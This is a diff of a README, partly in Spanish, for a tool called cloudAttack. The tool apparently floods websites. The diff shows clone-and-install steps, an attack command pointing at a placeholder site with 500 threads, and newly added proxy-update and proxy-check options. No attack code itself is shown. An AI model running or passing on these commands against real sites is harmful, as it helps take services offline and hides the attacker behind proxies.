@@ -35,9 +35,9 @@ git clone https://github.com/dcodeni/cloudAttack.git
 cd cloudAttack
 chmod +x install.sh
 ./install.sh or bash install.sh
-Run "node cloudattack.js --attack yoursite --threads 5"
-
+Run "node cloudattack.js --attack yoursite --threads 5 "
 (Example: node cloudattack.js --attack "https://www.badsite.com" --threads 500)
+opcional: --updateproxy true --checkproxy true
 ```
 
 ## Dependencias:
